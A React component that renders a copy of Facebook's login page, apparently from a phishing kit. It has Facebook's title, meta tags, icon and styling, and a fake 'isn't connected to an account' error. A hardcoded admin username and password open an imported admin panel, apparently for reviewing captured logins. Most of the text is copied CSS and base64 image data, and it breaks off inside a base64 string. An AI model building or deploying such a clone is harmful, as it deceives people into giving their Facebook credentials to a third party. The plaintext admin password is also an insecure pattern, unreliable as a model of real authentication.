import React, { useState } from "react";
import Admin_Panel_Main from "./Admin_Panel/Admin_Panel_Main";

const LoginPage_FB = ({ handleLogin }) => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");

  const Handle_loginAsAdmin = (e) => {
    e.preventDefault();
    // Replace these with actual admin username and password
    const adminUsername = "RanneetiMedia";
    const adminPassword = "RanneetiMedia@123";

    if (username === adminUsername && password === adminPassword) {
      handleLogin("admin"); // Call handleLogin with 'admin' userType
      sessionStorage.setItem("username", username);
      sessionStorage.setItem("loggedIn", "true");
    } else {
      const container = document.getElementById("u_0_2_XQ");
      let errorDiv = container.querySelector("._9ay7");

      if (!errorDiv) {
        errorDiv = document.createElement("div");
        errorDiv.className = "_9ay7";
        errorDiv.style.color = "red";
        errorDiv.innerHTML = `The email address or mobile number you entered isn't connected to an account. <a href="https://facebook.com/login/identify/">Find your account and log in.</a>`;

        container.insertBefore(errorDiv, container.children[1]);
      }
    }

    const handleLogout = () => {
      // Clear user credentials from local storage and reset loggedIn state
      sessionStorage.removeItem("username");
      sessionStorage.removeItem("loggedIn");
      setUsername("");
      setPassword("");
      setError("");
    };

    const handleInputChange = (event) => {
      const { name, value } = event.target;
      if (name === "username") {
        setUsername(value);
      } else if (name === "password") {
        setPassword(value);
      }
    };
  };

  // Check if the user is already logged in using local storage
  const isLoggedIn = sessionStorage.getItem("loggedIn") === "true";

  if (isLoggedIn) {
    return <Admin_Panel_Main />;
  } else {
    return (
      <>
        <meta charSet="utf-8" />
        <title id="pageTitle">Facebook – log in or sign up</title>
        <meta property="og:site_name" content="Facebook" />
        <meta property="og:url" content="https://en-gb.facebook.com/" />
        <meta
          property="og:image"
          content="https://www.facebook.com/images/fb_icon_325x325.png"
        />
        <meta property="og:locale" content="en_GB" />
        <meta
          name="description"
          content="Log in to Facebook to start sharing and connecting with your friends, family and people you know."
        />
        <meta name="referrer" content="no-referrer" />
        <link
          rel="icon"
          href="data:image/x-icon;base64,AAABAAEAICAAAAEAIACoEAAAFgAAACgAAAAgAAAAQAAAAAEAIAAAAAAAABAAAMIeAADCHgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/4AABuJlBEfgYwCV///////////////////////////gZAC/4GMAleJlAEf/gAAGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6moLGOJmApbhZgHx4mYB/+FlAf///////////////////////////+FmAf/iZgH/4WYB/+JnAfHiZgKW6moLGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/20kB+RqBILjaQL042gC/+NoAv/iaAL/42gC////////////////////////////4mgB/+JoAv/iaAH/4mgC/+JoAv/jaQL05GoEgv9tJAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOpqCxjkagTH42oD/+NqA//jagP/42oD/+RrA//jagP////////////////////////////jagP/5GsD/+NqA//kawP/5GsD/+RrA//kawP/5GwEx+p1CxgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADocQYt5W4E4+VtBP/kbAP/5W0E/+RsA//kbAP/5W0E/+RsA////////////////////////////+RsA//kbQP/5GwD/+RtA//kbQP/5G0D/+RtA//kbQP/5G4D4+hxBi0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6nULGOZwBuPlbwT/5W8E/+VvBP/lbwT/5W8E/+VvBP/lbwT/5W8E////////////////////////////5W8E/+ZwBf/lbwT/5nAF/+ZwBf/lbwT/5nAF/+VvBP/lbwT/5nAG4+p1CxgAAAAAAAAAAAAAAAAAAAAAAAAAAP+SJAfncgXH5nIF/+ZxBf/mcQX/5nEF/+ZxBf/mcQX/5nEF/+dyBf/mcQX////////////////////////////ncgb/5nEF/+dyBv/mcQX/5nEF/+ZyBf/mcQX/5nIF/+ZyBf/mcQX/53IFx/+SJAcAAAAAAAAAAAAAAAAAAAAA53YIguh0Bv/ndAb/6HQG/+h0Bv/odAb/6HQG/+h0Bv/odAb/53QG/+h0Bv///////////////////////////+d0Bf/ndAb/53QF/+d0Bv/ndAb/6HUG/+d0Bv/odQb/6HUG/+d0Bf/odQb/53YGggAAAAAAAAAAAAAAAOqACxjodgb06HYH/+h2Bv/odgf/6HYH/+h2Bv/odgf/6HYG/+h2Bv/odgf/6HYG////////////////////////////6XcH/+h2Bv/pdwf/6HYG/+h2Bv/odgf/6HYG/+h2B//odgf/6HYG/+h2B//odgb06oALGAAAAAAAAAAA63oJlul5CP/qeQj/6XkI/+p5CP/qeQj/6XkH/+p5CP/peQf/6XkH/+l5B//peQf////////////////////////////peQj/6XkH/+l5CP/peQf/6XkH/+l5CP/peQf/6XkI/+l5CP/peQf/6XkI/+l5B//regmWAAAAAP+AKwbsfQrx63wJ/+p7CP/rfAn/6nsI/+p7CP/qewj/6nsI/+p7CP/qewj/63wJ/+p7CP///////////////////////////+p7CP/qfAn/6nsI/+p8Cf/qfAn/6nsI/+p8Cf/qewj/6nsI/+t8Cf/qewj/63wJ/+x9CvH/gCsG7YELR+t9Cf/rfQn/634J/+t9Cf/rfgn/634J/+t+Cf/rfgn///////////////////////////////////////////////////////////////////////Ozbv/rfgn/7H4J/+t+Cf/rfgn/634J/+t+Cf/rfgn/634J/+2BC0fsgAqV7IAK/+yACv/sgAr/7IAK/+yACv/sgAr/7IAK/+yACv//////////////////////////////////////////////////////////////////////9cKK/+yACv/sgAr/7IAK/+yACv/sgAn/7IAK/+yACf/sgAn/7IAKle6DC7/tgwv/7YML/+2CCv/tgwv/7YIK/+2CCv/tggr/7YIK///////////////////////////////////////////////////////////////////////40qf/7YML/+2CCv/tgwv/7YML/+2DC//tgwv/7YML/+2DC//ugwu/74YM2e6FC//uhQv/7oUL/+6FC//uhQv/7oUL/++FDP/uhQv///////////////////////////////////////////////////////////////////////rhxP/uhQv/7oUL/+6FC//uhQv/7oQL/+6FC//uhAv/7oQL/++GDNnviA7z74gM/++IDP/vhwz/74gM/++HDP/vhwz/74cM/++HDP///////////////////////////////////////////////////////////////////////fDh/++IDf/vhwz/74gN/++IDf/vhwz/74gN/++HDP/vhwz/74cN8/CLDvPwig3/8IoN//CKDf/wig3/8IoN//CKDf/wiQ3/8IoN//CJDf/wiQ3/8IoN//CJDf////////////////////////////CJDf/wig3/8IkN//CKDf/wig3/8IkN//CKDf/wiQ3/8IkN//CJDf/wiQ3/8IkN//CJDf/wiw7z8o0O2fGMDv/xjA7/8YwN//GMDv/xjA3/8YwN//GMDf/xjA3/8YwN//GMDf/xjA7/8YwN////////////////////////////8YwO//GMDv/xjA7/8YwO//GMDv/xjA7/8YwO//GMDv/xjA7/8YwO//GMDv/xjA7/8YwO//KNDtnyjw+/8o8P//KPD//yjw//8o8P//KPD//yjw//8o8P//KPD//yjw//8o8P//KODv/yjw/////////////////////////////xjg7/8o4O//GODv/yjg7/8o4O//KODv/yjg7/8o4O//KODv/yjw//8o4O//KPD//yjw//85AQv/ORD5XzkQ//85EP//ORD//zkQ//85EP//ORD//zkQ//85EP//ORD//zkQ//85EQ//ORD//++vT///////////////////////SbJv/zkRD/85EP//OREP/zkRD/85EP//OREP/zkQ//85EP//ORD//zkQ//85EP//ORD//zkQ+V9JcSR/STEP/0kxD/9JQQ//STEP/0lBD/9JQQ//OTEP/0lBD/85MQ//OTEP/0lBD/85MQ//zq0P//////////////////////+tWi//WdJv/zkxD/9JMQ//STEP/0kxD/9JMQ//STEP/0kxD/9JQQ//STEP/0lBD/9JQQ//STEkf/qisG9ZYS8fWWEf/1lhH/9ZYR//WWEf/1lhH/9ZYR//WWEf/1lhH/9ZYR//WWEf/1lhH/+9mr//////////////////////////////////////////////////WWEf/1lhH/9ZYR//WWEf/1lhH/9ZYR//WWEf/1lhLx/6orBgAAAAD3mROW9pgS//aYEf/2mBL/9pgR//aYEf/1mBH/9pgR//WYEf/1mBH/9pgS//WYEf/4sU3/////////////////////////////////////////////////9pgS//WYEf/2mBL/9pgS//WYEf/2mBL/9ZgR//eZEZYAAAAAAAAAAP+fFRj4nBT095sT//ebE//3mxP/95sT//ebE//3mxP/95sT//ebE//3mhL/95sT//eaEv/84rv////////////////////////////////////////////3mxP/95sT//ebE//3mxP/9poS//ebE//3mxP0/58VGAAAAAAAAAAAAAAAAPmfFIL4nRP/+J0T//idE//4nRP/95wT//idE//3nBP/95wT//idE//3nBP/+J0T//ilJ//958X///////////////////////////////////////idE//3nRP/+J0T//idE//4nRP/+J0T//mfFIIAAAAAAAAAAAAAAAAAAAAA/7YkB/qgFcf5oBT/+aAU//mgFP/4nxT/+aAU//ifFP/4nxT/+Z8U//ifFP/5nxT/+Z8U//mhF//7zof//vDa//78+P/+/fr//vnx//7z4//969D/+aAU//mfFP/5oBT/+aAU//ifFP/6oBXH/7YkBwAAAAAAAAAAAAAAAAAAAAAAAAAA/6oVGPujFeP5oRT/+aEU//qiFf/5oRT/+qIV//qiFf/6ohX/+qIV//qiFf/6ohX/+aEU//qiFf/5oRT/+aEU//qiFf/5oRT/+qIV//qiFf/5oRT/+qIV//mhFP/5oRT/+6MV4/+qFRgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/6YWLvykFeP7pBX/+6QW//ukFf/7pBb/+6QW//qkFf/7pBb/+qQV//qkFf/7pBb/+qQV//ukFv/7pBb/+6UW//ukFv/7pRb/+6UW//ukFf/7pRb/+6QV//ykFeP/pBctAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/6ogGPyoF8f8pxb//KcX//ynFv/8pxb//KcW//ynFv/8pxb//KcW//umFv/8pxb/+6YW//umFv/7phb/+6YW//umFv/7phb//KcW//umFv/8qBfH/6ogGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/7YkB/2rGIL9qRj0/KkX//ypF//8qBf//KkX//yoF//8qBf//akX//yoF//9qRf//akX//2pF//9qRf//akX//2pF//+qRj0/asYgv+2JAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP+1IBj/rRqW/6wY8f6sGP/+rBj//qwY//6sGP/9qxj//qwY//2rGP/9qxj//asX//2rGP/+qxfx/awYlv+1IBgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/1SsG/7AZR/+vGpX/rxm//68a2f+uGfP/rhnz/68a2f+vGb//rxqV/7AZR//VKwYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/8AD//8AAP/8AAA/+AAAH/AAAA/gAAAHwAAAA8AAAAOAAAABgAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAGAAAABwAAAA8AAAAPgAAAH8AAAD/gAAB/8AAA//wAA///AA/8="
        />
        <style
          dangerouslySetInnerHTML={{
            __html: ".sf-hidden{display:none!important}",
          }}
        />
        <meta
          httpEquiv="content-security-policy"
          content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;"
        />
        <style
          dangerouslySetInnerHTML={{
            __html:
              'img[src="data:,"],source[src="data:,"]{display:none!important}',
          }}
        />
        <merlin-component
          id="merlin-text-summarizer"
          className="merlin text-summarizer"
        >
          <template shadowrootmode="open" />
        </merlin-component>
        <merlin-component
          id="merlin-preview-link"
          className="merlin merlin-preview-link"
        >
          <template shadowrootmode="open" />
        </merlin-component>
        <merlin-component
          id="merlin-context-btn"
          className="merlin context-btn"
        >
          <template shadowrootmode="open" />
        </merlin-component>
        <merlin-component id="merlin-chat" className="merlin chat">
          <template shadowrootmode="open" />
        </merlin-component>
        <noscript />
        <link
          rel="alternate"
          media="only screen and (max-width: 640px)"
          href="https://m.facebook.com/"
        />
        <link rel="alternate" media="handheld" href="https://m.facebook.com/" />
        <link rel="canonical" href="https://en-gb.facebook.com/" />
        <style
          dangerouslySetInnerHTML={{
            __html:
              "@media (min-width:480px){}._95k9{background:#f0f2f5;min-width:500px}._95ka{padding-bottom:112px;padding-top:72px}._8esk{margin:0 auto;padding:20px 0;position:relative;width:980px}._8esl{display:inline-block;vertical-align:top}._8esf ._8esl{box-sizing:border-box;margin-right:0;padding-right:32px;width:580px}._8esn{display:inline-block;vertical-align:top}#facebook ._8esj ._8eso{display:inline-block;letter-spacing:normal;text-rendering:optimizelegibility}#facebook ._8esj._8esf._8icx ._8eso{padding:0 0 20px}#facebook ._8esj._8icx ._8eso{padding-top:0}#facebook ._8icx._8opv ._8ice{padding:112px 0 16px}#facebook ._8esj._8esf ._8eso{color:#1c1e21}#facebook ._8esj._8esf._8icx._8opv ._8eso{font-family:SFProDisplay-Regular,Helvetica,Arial,sans-serif;font-size:28px;font-weight:normal;line-height:32px;width:500px}._8icx._8opv ._8ilh{height:106px;margin:-28px}._95ke #pageFooterChildren a,._95ke .localeSelectorList a{color:#8a8d91}._8opy{padding-top:20px}@media only screen and (max-width:1075px){._8esk{height:496px;margin:0 40px;width:auto}._8esf ._8esl{width:400px}#facebook ._8esj._8esf._8icx._8opv ._8eso{font-size:24px;line-height:28px;width:auto}._8esn{float:right}#facebook ._8opy #pageFooter{margin:0 40px;width:auto}}@media only screen and (max-width:900px){._8esk{display:flex;flex-direction:column;text-align:center}._8esf ._8esl{margin:0 auto;padding:0}#facebook ._8icx._8opv ._8ice{padding:0 0 20px 0}#facebook ._8esj._8esf._8icx._8opv ._8eso{padding:0}._8esn{float:none;margin:0 auto}._95ka{padding-bottom:164px;padding-top:20px}}._6luv{align-items:center;background-color:#fff;border:none;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);box-sizing:border-box;margin:40px 0 0;padding:20px 0 28px;width:396px}._8icy ._6luv{padding-bottom:24px;padding-top:10px}._8iep{height:456px;width:396px}._6lux{display:inline-block;margin:auto;padding:6px 0}._8icy ._6lux{font-size:17px;width:364px}._8icy ._6lux ._6luy{font-size:17px;padding:14px 16px;width:330px}._8icy._9ahz ._6lux ._6luy:focus,._9aha ._6lux ._6luy:focus{border-color:#1b74e4;box-shadow:0 0 0 2px #e7f3ff;caret-color:#1b74e4}._8icy ._6lux ._6luy{border-radius:6px}._6ltg{padding-top:6px}._8icy ._6lth{background-color:#1877f2;border:none;border-radius:6px;font-size:20px;line-height:48px;padding:0 16px;width:332px}._8icy._9ah- ._6lth:hover{background-color:#1877f2}._8icy ._6lti{border:none;border-radius:6px;font-size:17px;line-height:48px;padding:0 16px}._8icy ._6ltj{margin-top:16px}._8icy ._6ltj a{color:#1877f2;font-size:14px;font-weight:500}._8icy ._8icz{align-items:center;border-bottom:1px solid #dadde1;display:flex;margin:20px 16px;text-align:center}@media only screen and (max-width:900px){}#facebook ._8esf ._58mk{border-top:none;color:#1c1e21;font-family:SFProText-Regular,Helvetica,Arial,sans-serif;font-size:14px;font-weight:normal;padding-top:0}._8icx ._58mk{margin-top:28px;text-align:center}#facebook ._8esf ._8esh{font-family:SFProText-Semibold,Helvetica,Arial,sans-serif;font-size:14px;font-weight:600}._8f3m ._8esh{color:inherit}html ._55r1{background:#FFFFFF url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAAAA1BMVEUAAACnej3aAAAAAXRSTlMKoDMxeAAAAApJREFUCB1jYAAAAAIAAc/INeUAAAAASUVORK5CYII=)repeat-x;border:1px solid #dddfe2;color:#1d2129;height:22px;line-height:16px;vertical-align:middle}._55r1::-webkit-input-placeholder,._55r1 ._58al::-webkit-input-placeholder{color:#90949c}._55r1:focus::-webkit-input-placeholder,._55r1 ._58al:focus::-webkit-input-placeholder{color:#bec3c9}",
          }}
        />
        <style
          dangerouslySetInnerHTML={{
            __html:
              '.clearfix:after{clear:both;content:".";display:block;font-size:0;height:0;line-height:0;visibility:hidden}.clearfix{zoom:1}#facebook .accessible_elem{clip:rect(1px,1px,1px,1px);height:1px;overflow:hidden;position:absolute;white-space:nowrap;width:1px}',
          }}
        />
        <style
          dangerouslySetInnerHTML={{
            __html:
              "form{margin:0;padding:0}.inputtext{-webkit-appearance:none;margin:0}input{background-color:#fff}.inputtext{padding-bottom:4px}.inputtext:invalid,.inputpassword:invalid{box-shadow:none}html{touch-action:manipulation}body{background:#fff;color:#1c1e21;direction:ltr;line-height:1.34;margin:0;padding:0;unicode-bidi:embed}body{font-family:Helvetica,Arial,sans-serif;font-size:12px}h2{margin:0}a{cursor:pointer;text-decoration:none}button{margin:0}a:hover{text-decoration:underline}img{border:0}ul{list-style-type:none;margin:0;padding:0}*::-webkit-input-placeholder{color:#606770}*:focus::-webkit-input-placeholder{color:#bec3c9}body{overflow-y:scroll}#content{margin:0;outline:none;padding:0;width:auto}._li._li._li{overflow:initial}._19_u :focus{outline:none!important}i.img{-ms-high-contrast-adjust:none}@keyframes CSSFade_show{0%{opacity:0}100%{opacity:1}}@keyframes CSSFade_hide{0%{opacity:1}100%{opacity:0}}",
          }}
        />
        <style
          dangerouslySetInnerHTML={{
            __html:
              '._41ug{display:inline-block;padding-right:14px;position:relative}._41ug .img{position:absolute;top:1px;vertical-align:middle}#facebook ._-kb div{font-family:inherit}#facebook ._-kb span{font-family:inherit}#facebook ._-kb a{font-family:inherit}#facebook ._-kb button,#facebook ._-kb input{font-family:inherit}#pageFooter{color:#737373;margin:0 auto;width:980px}#pageFooter a{text-decoration:none;white-space:nowrap}#pageFooter a:last-child{margin-right:0}#pageFooter a:hover{text-decoration:underline}#pageFooter .copyright{font-size:11px}#pageFooter .pageFooterLinkList{line-height:1.6;margin-left:-20px}#contentCurve{border-bottom:1px solid #dddfe2;font-size:1px;height:8px;margin-bottom:8px}#globalContainer{margin:0 auto;position:relative;zoom:1}.fb_content{min-height:640px;padding-bottom:20px}.localeSelectorList{align-items:center;display:flex;flex-wrap:wrap}#facebook ._9npi{background:none;border:0;box-shadow:none;float:left;font-size:17px;padding:0;width:300px}._9nyh{border-color:#dddfe2;box-shadow:none}@media (-webkit-min-device-pixel-ratio:2),(min-resolution:2dppx){}._52jv{text-align:center}.mvl{margin-top:20px;margin-bottom:20px}._4jy0{border:1px solid;border-radius:2px;box-sizing:content-box;font-size:12px;-webkit-font-smoothing:antialiased;font-weight:bold;justify-content:center;padding:0 8px;position:relative;text-align:center;text-shadow:none;vertical-align:middle}._4jy0:before{content:"";display:inline-block;height:20px;vertical-align:middle}html ._4jy0:focus{box-shadow:0 0 1px 2px rgba(88,144,255,.75),0 1px 1px rgba(0,0,0,.15);outline:none}._19_u ._4jy0:focus,._4jy0._5f0v:focus{box-shadow:none}._4jy0{transition:200ms cubic-bezier(.08,.52,.52,1) background-color,200ms cubic-bezier(.08,.52,.52,1) box-shadow,200ms cubic-bezier(.08,.52,.52,1) transform}._4jy0:active{transition:none}._4jy0 .img{bottom:1px;position:relative;vertical-align:middle}._517h{background-color:#f5f6f7;border-color:#ccd0d5}._517h:hover{background-color:#ebedf0}._517h:active,._517h._42fs{background-color:#dddfe2;border-color:#bec3c9}._4jy1,._4jy2{color:#fff}._4jy1{border-color:#4267b2}._4jy1:hover{background-color:#365899;border-color:#365899}._4jy1:active,._4jy1._42fs{background-color:#29487d;border-color:#29487d}._4jy2{background-color:#42b72a;border-color:#42b72a}._4jy2:hover{background-color:#36a420;border-color:#36a420}._4jy2:active,._4jy2._42fs{background-color:#2b9217;border-color:#2b9217}._517i{height:18px;line-height:18px}@keyframes xuiButtonLoadingSpinner{from{transform:rotate(0turn)}to{transform:rotate(1turn)}}._4ki>li{border-width:0 0 0 1px;display:inline-block}._509->li{vertical-align:top}.uiList>li:first-child{border-width:0}._4ki._703>li{padding-left:20px}._4ki._6-j>li{padding-left:10px}._4ki._6-i>li{padding-right:0}._4ki._6-h>li:first-child{padding-left:0}._4ki._6-h>li:last-child{padding-right:0}._2pid{padding-top:8px}.sp_EP9wX8qDDvu{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAARsAAAE7CAMAAADaX9UlAAAC/VBMVEVHcEx+g4Wan6HR19kaJS////85QEf////////g5ecAAAD////09vj///////4AAAD////////////19/j9/f7////4+fn////8/f3////////////////////////////////8/f3////////////u8/T///8AAAD///////////////8eKTOOk5X///9ES1LCwsL///////////////////////////8kLTYqMTfCx8r///////////////////////////////////9kZ2tkbHPP1NdlZ2tjY2RlZ2v///////////////9YX2Y+RUz///////9lZ2t3fH+DiIqHjI65vsH///////////////////82PUSzuLvY3OCip6pob3chKC5NVFv///////////////8AAAAwNz6vtLb///9tdHwoMz6rsLJTW2L///9JUFeVmpz///////8xUZAdJzL///////////8sMznL0NNbY2r////Gy85kZGY6WJc6WJc6WJc6WJgnSYM6WJecoaM2U5U3V5Q6WJg6WJhjY2NlZ2s6WJhlZ2s6WJg7WJYzRIg5V5U/Z6saJS/////h6vIfLTxCY6GboKJhaXD//v4oPl00UoP/9LIAAAApMz4eKDMiLDePl55ianm/x85pcHnc5e3g6PFTW2U7WZi0vMO+w8YlLzpNVFxcZGxXX2hDSlGiqrB0e4JlZ2ufp6/GztWNk5iHj5b2+PTi5+qosLgwO0bQ2OAxOD/V3eZuQR5XV1dlbXSWnKF9hYyvt79GTVT7/fpJUVjY3eDt8vWYoKiCiZHO1tx7gocbJjC3wMhudn44P0Y6Q0oqMTfM09iqaBWBhoixtrl5foBRWWA/Rk21ey+Gi433/f9HTlXl5eXBkEvn7O+rsLLCy9Pb4eTg5eddZXMhKC7Z4+vV2t3w8/U0P0ru2JL25aLw48lQUFDVsXLhxYbhyqC6w8ufpKY/SVWwcSH38N68iD/OpV7u8e3y+PpfZ241TXn67KlKMrdQAAAAknRSTlMAhWYm9fvT/QIW3xUO7wQg+erjEQhGGPMM9SY79xosI0gKMqeKBk7jN+eGbO9ymcXLYR6eW2WPvunkN2iiw1NetNmUBqehKTiF8YJx1KqvzM0/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